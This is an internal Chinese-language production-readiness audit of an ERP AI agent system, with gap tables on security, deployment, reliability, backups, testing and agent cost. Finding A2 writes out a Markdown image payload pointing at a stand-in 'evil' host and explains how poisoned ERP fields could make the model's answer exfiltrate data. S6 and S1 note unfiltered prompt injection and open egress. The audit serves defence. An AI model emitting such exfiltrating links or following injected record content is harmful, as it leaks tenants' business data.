# 生产就绪第二轮审计（2026-09-03）

范围：在 2026-09-02 "demo 与生产 Agent 系统七个差别"审计（评估集、错误分类、卡 Running、完成判定、流程骨架、提案出口、可观测性）之外，按安全、部署、可靠性、数据、质量、Agent 特有六路只读复审全仓。方法：六个只读 Explore 代理各出缺口表，Claude 对全部 P0 与关键 P1 逐条回读源码核验；未运行集成测试、未操作站点。定级：P0 = 首个真实租户前不修就会被生产校验直接否决或造成不可恢复后果；P1 = 首个真实租户前必须修；P2 = 可排期。编号在[生产化总体设计](../superpowers/specs/2026-09-03-production-hardening-design.md)中引用。

## 已核验为生产级、设计中保持不动的底座

- 模型无法指定 site/actor；worker profile 覆盖任务字段（`dsherp/context_worker.py:71`），容器内 MCP 只读 `config['site']`（`dsherp/context_mcp.py:85`）。
- 运行凭据 sha256 存储 + `hmac.compare_digest` + 过期 + 结束清空（`frappe_app/dsherp_bridge/context_execution.py:69,109,289`）；每次工具调用切到 run.owner 并复核权限修订（`:23,237`）。
- 写入白名单：字段类型/permlevel/系统字段拒绝（`operations.py:646-676`）、配置包全属性枚举（`configuration_bundle.py:15-104`）、make 仅走代码内注册 adapter（`make_adapters.py:75`）；确认摘要服务端派生，模型不可改写（`operations.py:412`）。
- 幂等与先落意图：执行记录对提案 unique（`ds_execution_record.json:18-24`），`insert(Running)`+commit 后才调业务方法（`operations.py:155-159`）；run_id 由 `sha256(user+request_id)` 派生（`context_api.py:308-317`）；来源账本对 Stock Ledger Entry 只读回查（`operations.py:269-306`）。
- 领取原子性：`claim_run` 对运行服务身份 User 行 FOR UPDATE（`context_execution.py:83-84`）；宿主 flock 单实例（`context_worker.py:130-132`）；孤儿容器 `docker rm -f` 兜底（`:59-60`）。
- 容器最小权限：read-only、cap-drop=ALL、no-new-privileges、pids/memory/cpu 限制、tmpfs（`dsherp/runtime_host.py:20-23`）；docker socket 未挂入；`toolBash/toolJobs: false`（`config/dsh-context.yml:18`）。
- 供应链：镜像 digest 钉死并有守门测试（`tests/test_v16_deployment_contract.py:17-27`）；`requirements.lock` 全量 hash 且容器内 `--require-hashes`（`infra/prepare_agent_runtime.sh:12`）；npm lock 全带 integrity；skill sha256 + 运行时文件指纹（`dsherp/runtime_revision.py:12-41`、`runtime/model-guard.cjs:27-63`）。
- 测试替身是真协议：合成 provider 走真实 SSE/工具调用（`tests/conftest.py:29`），压缩、取消、漂移均有确定性负例；前端无 `dangerouslySetInnerHTML`，fetch 失败均落可见错误态。
- 备份恢复验证做真恢复 + 逐字段比对 + drop（`infra/verify_daily_backup.py:157-201`）；JSON payload 带 `schema_version`（`context_api.py:31-34`）。

## P0 汇总（15 项，按首个租户前的阻断性排序）

| ID | 缺口 | 证据 | 核验 |
|---|---|---|---|
| D1 | 无 Dockerfile、11 个服务 `pull_policy: never`、应用代码靠 bind-mount 宿主相对路径进容器，无可版本化部署单元 | `infra/compose.validation.yml:6,50,85…`、`dsherp/context_container.py:7-13` | 已核验（`find Dockerfile` 为空） |
| D2 | 常驻 worker 只有 macOS LaunchAgent，测试把 plist 写成契约；无 systemd | `infra/render_context_worker_launch_agent.py`、`tests/test_v16_deployment_contract.py:105-127` | 已核验 |
| D3 | 全链路无 TLS，域名/端口/站点名/网络名硬编码 `*.localhost`/`127.0.0.1:180xx`，无环境区分 | `compose.validation.yml:42,67,216`、`infra/provision_desk_oauth.py:7-25,90-93` | 已核验 |
| D4 | 无升级路径：v15→v16 为 fresh provision；两个 App 均无 `patches.txt`；回滚材料只在被 gitignore 的 `work/` | `docs/engineering/v16-migration-evidence.md:261,265`、`.gitignore:16` | 已核验 |
| S1 | Agent 容器接 `dsherp-validation_api`（非 internal），出网无限制，模型侧数据外传无阻断 | `dsherp/runtime_host.py:23`、`compose.validation.yml:238` | 已核验 |
| S2 | 平台站集中保存每个成员的业务站 api_key/api_secret，无轮换；平台沦陷即全租户凭证泄露 | `frappe_app/dsherp_platform/api.py:50`、`infra/bind_identity.py:21` | 已核验 |
| R1 | `run_status` 每 2s 触发 `require_revision` + `_public`（对会话全历史每条 source 每条记录 `check_permission`），并持 run 行 FOR UPDATE；会话变长后 poll 超 20s 即 ReadTimeout → 运行 Failed | `context_execution.py:121-124`、`context_api.py:119-135` | 已核验 |
| R2 | `finish_run` 在 try 之外，`poll_once` 只吞 5xx；用户在答案生成瞬间取消 → finish_run(Succeeded) 得 403 → worker 进程退出 | `dsherp/context_worker.py:72-77,86-89,137-143`、`context_execution.py:281` | 已核验 |
| R3 | 站点级单运行闸门：任一 Running/Cancelling 即 `claim_run` 返回 None；加 3s 轮询，吞吐上限约 20 次/小时/站；单 worker 只服务一个站 | `context_execution.py:87`、`context_worker.py:130-143` | 已核验 |
| A1 | 单 provider 单模型硬钉（`deepseek-v4-flash`），无重试/熔断/健康探针/告警；provider 抖动 = 全站 Agent 失效且无感知 | `context_execution.py:134`、全仓无 `retry/429/backoff` | 已核验 |
| A2 | 模型回答按 Markdown 渲染，`skipHtml` 不拦 `![](https://evil/?d=…)`，且无 CSP；被污染 ERP 字段可零点击外带数据 | `frontend/src/agent-ui.jsx:60`、`frappe_app/` 无 CSP | 已核验（组件未覆盖 img/a） |
| T1 | 备份与数据同宿主同卷，只覆盖 daily 一站；`site_config_backup.json`（含 encryption_key）与库转储同目录同权限；平台站无备份 | `infra/verify_daily_backup.py:12-14,166` | 已核验 |
| Q1 | Frappe `frappe.throw` 走 HTTP 417，前端只解析 401/403 的 exception，其余吞成"请求未完成（HTTP nnn）"；全仓无 ErrorBoundary | `frontend/src/context-api.js:43-52`、`agent-workbench-entry.js:13` | 已核验 |
| Q2 | 23 个 Frappe 侧模块零离线测试，全部依赖活站 + docker exec；无 CI、lint、pytest 配置、覆盖率 | `.venv` 无 frappe、`tests/integration/test_operation_proposals.py:78`、仓库根无 `.github/` | 已核验 |
| T2 | 审计 DocType `permissions: []` 且无 `on_trash` 守卫，站点管理员可硬删执行记录；无 `track_changes` | `ds_execution_record.json:45`、各 doctype `.py` 仅 validate | 已核验 |

## P1 / P2 明细（按维度）

### 安全与租户隔离（S）

| ID | 级别 | 缺口 | 证据 |
|---|---|---|---|
| S3 | P1 | 业务站无 grant 即放行：直接密码登录可绕过平台 membership；平台停用成员不切断业务站访问 | `sso.py:99-100`、`infra/seed_identity.py:31-35` |
| S4 | P1 | `platform_grant`（平台 OAuth token 密文）永久落在每条运行行，结束只清 capability_hash | `context_api.py:328`、`context_execution.py:288-289` |
| S5 | P1 | 6 个 `allow_guest` POST 端点仅凭 bearer capability / 对称 HMAC，无速率限制、无审计日志；`receipt_transfer` 以信封内 actor `set_user` | `context_execution.py:118,128,155,276`、`configuration_transfer.py:165` |
| S6 | P1 | 提示注入无结构化防护：ERP 记录/搜索结果/快照原样进模型，仅靠 persona 文案 | `config/dsh-context.yml:9`、`context_runner.py:89` |
| S7 | P1 | Agent 容器 `--user 0:0`；控制面 compose（含 `.runtime/control/*` 路径）挂入租户容器只为算哈希 | `runtime_host.py:22`、`context_container.py:11-12` |
| S8 | P1 | 每个业务请求同步回源平台校验 grant（HTTP，15s 超时）：平台是所有业务站的同步单点，且逐请求加延迟 | `sso.py:98-103`、`:40-44`（Claude 补充） |
| S9 | P2 | 凭证文件先写后 chmod 的 0644 窗口；OAuth secret 轮换为手工脚本无版本；probe 把仓库根（含 .env）挂入容器；`finish_run` answer 无长度上限；交接信封无 nonce | `infra/run_identity_seed.py:15`、`infra/rotate_desk_oauth_secret.py:11-16`、`infra/probe_v16/t1_2_agent_runtime.sh:11`、`configuration_transport.py:25` |

### 部署、环境与供应链（D）

| ID | 级别 | 缺口 | 证据 |
|---|---|---|---|
| D5 | P1 | 零 healthcheck，9/11 服务 `restart: "no"`；Day 0 已实证 scheduler OOM 不自愈 | `compose.validation.yml` |
| D6 | P1 | 开站需 ≥9 个脚本 + 人工 docker exec 编排；脚本存在即 fastfail 不可续跑；无下线/删站流程；`.runtime/control/*` 密码无生成脚本 | `infra/provision_*.py`、`setup_platform.py`、`bind_identity.py` |
| D7 | P1 | 无 SBOM/CVE 扫描；npm 全走 npmmirror；DSH SDK 为预发布 `0.1.1rc1`；镜像 digest 是否多架构未确认 | `requirements.in:1`、`frontend/package-lock.json` |
| D8 | P1 | 前端 dist 入库但无源码-产物一致性门禁；Node/npm 无版本钉；宿主 3.12/容器 3.14 双运行时无 `.python-version` | `frontend/package.json`、`.gitignore:12-14` |
| D9 | P2 | 无 `.env.example`；上游翻译 sha 只在文档；`runtime-files.json` 不含 `frappe_app/**` 与 dist | `config/runtime-files.json` |

### 可靠性、并发与生命周期（R）

| ID | 级别 | 缺口 | 证据 |
|---|---|---|---|
| R4 | P1 | 超时链倒挂：模型单请求 120s/90s > 容器 140s > `expires_at` 180s；超时后运行仍 Running 直到下次 claim 才 Failed；预算 reserve 不退 | `session_runtime.py:18`、`context_worker.py:44`、`context_execution.py:110,149` |
| R5 | P1 | `expires_at` 只在 claim 设定、无续期，且过期校验作用于 `finish_run`：累计超 180s 答案丢失并触发 R2 | `context_execution.py:70,110` |
| R6 | P1 | 取消后 `future.result(timeout=5)` 超时 → `shutdown(wait=True)` 阻塞到模型请求自然结束，终态 Failed 而非 Cancelled | `context_runner.py:49-67` |
| R7 | P1 | Queued 无过期；docker 不可用时 worker 启动即抛并被 KeepAlive 无限重启；会话被 `active_run` 锁死无降级提示 | `context_worker.py:133-134`、`context_api.py:323-330` |
| R8 | P1 | run 行是 `run_tool`/`run_status`/`reserve_model_call` 的单点 FOR UPDATE；锁等待 50s > httpx 20s | `context_execution.py:68,130,157` |
| R9 | P2 | `run.json` 含 provider key 写在 `work/`，SIGKILL 后残留无扫尾；`.runtime/business-sessions/*` 只增不删；配置确认只捕获 DeadlockError；`post()` 对非 JSON 200 抛 KeyError 崩 worker | `context_worker.py:37-41,128,138`、`configuration_execution.py:181`、`context_mcp.py:22-27` |

### 数据、备份与审计追踪（T）

| ID | 级别 | 缺口 | 证据 |
|---|---|---|---|
| T3 | P1 | 执行记录与业务单据只靠 result JSON 关联，非 Link；单据删除无引用保护，单据侧无法反查 | `operations.py:235-236` |
| T4 | P1 | 模型会话/转录落宿主 `.runtime/business-sessions/`，明文、不备份、不加密、无清理；无保留期/导出/删除能力 | `context_worker.py:128`、`context_container.py:16`、`ds_conversation.json` |
| T5 | P1 | 用量字段不能算钱：只有 calls/input_bytes/reserved_tokens；provider/model/purpose 收到不落库；无实际 token、耗时、skill 版本、request id | `ds_model_run.json`、`context_execution.py:129-151` |
| T6 | P1 | 审计可见性随权限漂移，无管理员侧审计查询入口；DS Doctype Policy 改动无版本 | `context_api.py:172-175`、`ds_doctype_policy.json` |
| T7 | P1 | 无备份调度配置、RPO/RTO 未定义、"备份未压缩"不变量靠脚本兜底 | `compose.validation.yml:90-131` |
| T8 | P2 | 无 `search_index`、`_summaries` 对每会话重跑 `_public`；子表 autoname 覆盖 hack；`autoname:hash` 跨站不唯一；`expires_at` naive 时区；answer/sources/result 大字段无界 | `context_api.py:120,172`、`operations.py:74-102,611` |

### 质量保障与前端（Q）

| ID | 级别 | 缺口 | 证据 |
|---|---|---|---|
| Q3 | P1 | 集成清理靠容器内脚本 finally，外层 `subprocess.run` 超时直接杀脚本留残留（已发生）；`test_policy_seed` 9 红未收敛 | `tests/integration/*`、`stage-2-3-manufacturing-evidence.md:156` |
| Q4 | P1 | 无浏览器 e2e，全部人工截图；v16 已因此漏出 417 与 `/desk/home` 权限弹窗 | `v16-migration-evidence.md:130` |
| Q5 | P1 | `ContextSidebar` 轮询一旦出错永久停摆且 `fail()` 清空会话列表 | `ContextSidebar.jsx:40-44,125` |
| Q6 | P2 | `crypto.randomUUID` 在非安全上下文为 undefined；长列表无虚拟化；权限矩阵散落 43 个文件无表；无负载/混沌测试；无 i18n（前端按中文串匹配后端 exception）；README 测试数字漂移 | `ContextSidebar.jsx:103`、`context-api.js:20`、`README.md:11` |

### Agent 特有、成本与供应商（A）

| ID | 级别 | 缺口 | 证据 |
|---|---|---|---|
| A3 | P1 | skill 非强制装载：系统提示只有一句 persona，skill 正文靠模型主动调 `skill` 工具 | `config/dsh-context.yml:9`、`tests/test_model_guard.py:47` |
| A4 | P1 | 工具返回无字节/行数上限、无分页游标；单条大单据即让下次 `input_bytes>131072` 被拒 | `dsherp/read_tools.py:16`、`api.py:53-83` |
| A5 | P1 | 无按用户/租户/日/月额度；单会话 1 在飞但会话数不限；无循环工具调用检测 | `context_api.py:323-325`、`context_execution.py:145` |
| A6 | P1 | 转录不含工具结果与模型中间消息；run 不记录模型名/温度/prompt 版本/skill 版本明文；`runtime_revision` 含密钥哈希不可反查，密钥轮换作废全部会话 | `context_execution.py:254-269,106-108`、`runtime_revision.py:40` |
| A7 | P2 | `company_scope` 定义但无判定代码；工具描述与实现限制不一致；`_forbid_extra_tool_arguments` 只覆盖 2 个工具；compaction 无重试且阈值 2% 偏早；术语包不覆盖工具返回 label；`freeze_bundle` 无体量上限；遗留 `erp_mcp.py` 静态凭证未退役 | `doctype_policy.py:17`、`read_tools.py:25`、`context_mcp.py:55,78`、`config/dsh-business.yml:7-10`、`dsherp/erp_mcp.py:14` |

## 需运行态才能确认的存疑项

1. `api` 网络出网能力与 Agent 容器实际可达外网范围（仅预览站有等价测试 `tests/integration/test_preview_isolation.py`）。
2. Frappe `session_expiry` 与 Cookie Secure/HttpOnly/SameSite 实际值；主站 nginx `location /` 无 Origin 校验时的跨站 POST 行为。
3. `after_request` 在异常路径是否触发（GET_LOCK 是否泄漏到连接生命周期）。
4. R1 的临界点：会话 10+ 轮、search 100 条时 `run_status` P95。
5. DSH 0.1.1rc1 二进制 Runtime 是否内置 429/超时重试（影响 `reserve_model_call` 与真实计费的对应关系）。
6. 镜像 digest `493cecf8…` 是否为多架构 manifest；若为 arm64 单架构，amd64 主机无法拉取。
7. Frappe 是否为 Link 字段自动建索引；`autoname:hash` 冲突时是否自动重试。

## 与七维审计的关系

七维审计的五项整改（失败运行变数据、错误三分类、提案/运行出口、业务前置校验、流程骨架进代码）全部并入总体设计的工作流 C、D、F；本轮新增的 P0 中 D1–D4、S1–S2、T1 属于七维审计未覆盖的部署与数据面，R1–R3 与 A1–A2 是底座在真实并发与真实 provider 下的新发现。
